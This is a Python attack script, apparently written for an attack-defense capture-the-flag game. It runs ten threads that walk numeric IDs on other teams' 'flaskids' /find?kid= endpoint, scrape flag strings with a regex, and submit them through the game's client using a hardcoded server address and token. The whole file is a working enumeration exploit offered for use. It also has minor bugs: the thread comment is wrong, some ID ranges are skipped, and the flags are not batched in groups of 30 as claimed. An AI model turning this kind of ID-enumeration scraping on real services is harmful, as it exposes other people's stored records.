import re
import requests
import datetime
from swpag_client import Team
from threading import Thread


# This module scans a wide range of ids present in the Kids Table for the database associated with the flaskids service
# On each request, it does a REGEX lookup to extract any potential flags which are then submitted in chunks of 30


t = Team('http://52.37.204.0/', 'S4f8RdeFHFvQ6ZszSDTU')
collected_flags = set()


def chunker_list(seq, size):
    return (seq[i::size] for i in range(size))


def task(start_id, end_id):
    for team in [str(_['hostname']) for _ in t.get_targets(3)]:
        for i in range(start_id, end_id):
            try:
                # update the collected_flags set with any flags captured by the regex matcher
                # on the response of each request
                collected_flags.update(set(
                    re.findall(r'FLG.{13}',
                               requests.get(f'http://{team}:10003/find?kid={i}', timeout=2).text)
                ))
            except:
                pass  # ignore


# create two new threads
t1 = Thread(target=task, args=(1, 50))
t2 = Thread(target=task, args=(51, 100))
t3 = Thread(target=task, args=(101, 150))
t4 = Thread(target=task, args=(151, 200))
t5 = Thread(target=task, args=(201, 250))
t6 = Thread(target=task, args=(251, 300))
t7 = Thread(target=task, args=(301, 350))
t8 = Thread(target=task, args=(351, 400))
t9 = Thread(target=task, args=(451, 500))
t10 = Thread(target=task, args=(551, 600))

# start the threads
t1.start()
t2.start()
t3.start()
t4.start()
t5.start()
t6.start()
t7.start()
t8.start()
t9.start()
t10.start()

# wait for the threads to complete
t1.join()
t2.join()
t3.join()
t4.join()
t5.join()
t6.join()
t7.join()
t8.join()
t9.join()
t10.join()


print(f"found the following flags: {collected_flags}")
for chunk in chunker_list(list(collected_flags), 30):
    print(f"\n\nsubmitting the following: {chunk}")
    print(t.submit_flag(chunk))

    with open("flaskids_stealer.log", "a") as myfile:
        myfile.write(f"\nSuccess - {datetime.datetime.now()} ")
